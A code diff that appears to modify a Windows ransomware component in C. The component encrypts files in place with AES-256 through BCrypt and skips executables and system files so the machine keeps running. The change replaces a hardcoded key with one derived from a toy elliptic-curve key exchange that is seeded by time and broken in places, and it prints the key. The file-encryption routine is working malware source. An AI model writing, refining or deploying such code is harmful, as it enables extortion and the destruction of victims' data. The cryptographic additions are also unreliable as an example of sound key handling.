@@ -1,4 +1,6 @@
 #include <stdio.h>
+#include <stdlib.h>
+#include <time.h>
 #include <Windows.h>
 #include <bcrypt.h>
 
@@ -18,6 +20,61 @@ typedef struct _ENCRYPTED_FILE_HEADER {
     BYTE    Signature[0x04];
     BYTE    IV[AES_BLOCK_SIZE];
 } ENCRYPTED_FILE_HEADER, * PENCRYPTED_FILE_HEADER;
+
+typedef struct {
+    int x;
+    int y;
+} Point;
+
+const int p = 173; // Prime number
+const int a = 23;
+const int b = 11;
+const Point alpha = { 5, 1 }; // A point on the curve
+
+int mod(int a, int b) {
+    int r = a % b;
+    return r < 0 ? r + b : r;
+}
+
+int modInverse(int a, int m) {
+    a = mod(a, m);
+    for (int x = 1; x < m; x++) {
+        if (mod(a * x, m) == 1) {
+            return x;
+        }
+    }
+    return -1;
+}
+
+Point pointAdd(Point P, Point Q) {
+    if (P.x == Q.x && P.y == Q.y) {
+        int s = mod((3 * P.x * P.x + a) * modInverse(2 * P.y, p), p);
+        int x = mod(s * s - 2 * P.x, p);
+        int y = mod(s * (P.x - x) - P.y, p);
+        return (Point) { x, y };
+    }
+    else {
+        int s = mod((Q.y - P.y) * modInverse(Q.x - P.x, p), p);
+        int x = mod(s * s - P.x - Q.x, p);
+        int y = mod(s * (P.x - x) - P.y, p);
+        return (Point) { x, y };
+    }
+}
+
+Point pointMultiply(Point P, int n) {
+    Point R = P;
+    for (int i = 1; i < n; i++) {
+        R = pointAdd(R, P);
+    }
+    return R;
+}
+
+void printHex(BYTE* data, size_t len) {
+    for (size_t i = 0; i < len; i++) {
+        printf("%02x", data[i]);
+    }
+    printf("\n");
+}
 
 BOOL Aes256EncryptBuffer(BYTE* pbKey, BYTE* pbIV, BYTE* pbData, DWORD cbData, BYTE* pbEncryptedData, DWORD* pcbEncryptedData) {
     BCRYPT_ALG_HANDLE hAlg = NULL;
@@ -95,7 +152,6 @@ BOOL ReplaceWithEncryptedFile(IN LPWSTR szFilePathToEncrypt) {
     ENCRYPTED_FILE_HEADER   EncryptedFileHeader = { 0 };
     WCHAR* szBlackListedExtensions[11] = { ENCRYPTED_FILE_EXTENSION, L".exe", L".dll", L".sys", L".ini", L".conf", L".cfg", L".reg", L".dat", L".bat", L".cmd" };
 
-    BYTE pbKey[AES_KEY_SIZE] = { 0x4D, 0x09, 0x25, 0x11, 0xC6, 0xE1, 0xAE, 0x3B, 0x44, 0x9B, 0x8B, 0xC2, 0xD3, 0x7A, 0x91, 0xF8, 0xBF, 0x08, 0xD8, 0x82, 0x10, 0x32, 0x41, 0x06, 0x5F, 0x89, 0x62, 0x57, 0x94, 0x6B, 0xFD, 0xA3 };
     BYTE pbIV[AES_BLOCK_SIZE] = { 0xCE, 0xD4, 0xAF, 0xBB, 0x50, 0x77, 0x67, 0x7E, 0x2A, 0xF5, 0x12, 0xD1, 0x82, 0xC3, 0x6D, 0x69 };
 
     if (!szFilePathToEncrypt)
@@ -176,6 +232,48 @@ BOOL ReplaceWithEncryptedFile(IN LPWSTR szFilePathToEncrypt) {
         printf("[!] File Already Encrypted \n");
         goto _END_OF_FUNC;
     }
+
+    // Generate random private keys na and nb
+    srand((unsigned int)time(NULL));
+    int na = rand() % 150 + 1;
+    int nb = rand() % 150 + 1;
+
+    // Calculate public keys
+    Point Pa = pointMultiply(alpha, na);
+    Point Pb = pointMultiply(alpha, nb);
+
+    // Calculate shared secret
+    Point Sa = pointMultiply(Pb, na);
+    Point Sb = pointMultiply(Pa, nb);
+
+    // Ensure Sa and Sb are the same
+    if (Sa.x != Sb.x || Sa.y != Sb.y) {
+        printf("[!] ECDH key exchange failed\n");
+        goto _END_OF_FUNC;
+    }
+
+    // Derive AES key using SHA-256 hash of shared secret
+    BYTE sharedSecret[64];
+    _snprintf_s((char*)sharedSecret, sizeof(sharedSecret), sizeof(sharedSecret), "%d%d", Sa.x, Sa.y);
+
+    BYTE pbKey[AES_KEY_SIZE];
+    BCRYPT_ALG_HANDLE hAlg = NULL;
+    if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_SHA256_ALGORITHM, NULL, 0) != 0) {
+        printf("[!] Failed to open SHA-256 algorithm provider\n");
+        goto _END_OF_FUNC;
+    }
+
+    if (BCryptHash(hAlg, NULL, 0, sharedSecret, sizeof(sharedSecret), pbKey, AES_KEY_SIZE) != 0) {
+        printf("[!] Failed to hash shared secret\n");
+        BCryptCloseAlgorithmProvider(hAlg, 0);
+        goto _END_OF_FUNC;
+    }
+
+    BCryptCloseAlgorithmProvider(hAlg, 0);
+
+    // Print the generated AES key
+    printf("Generated AES Key: ");
+    printHex(pbKey, AES_KEY_SIZE);
 
     DWORD cbEncryptedData = dwFileBufferSize + AES_BLOCK_SIZE;
     if (!Aes256EncryptBuffer(pbKey, pbIV, (BYTE*)uFileBufferAddr, dwFileBufferSize, (BYTE*)(uEncryptedFileBufferAddr + sizeof(ENCRYPTED_FILE_HEADER)), &cbEncryptedData))
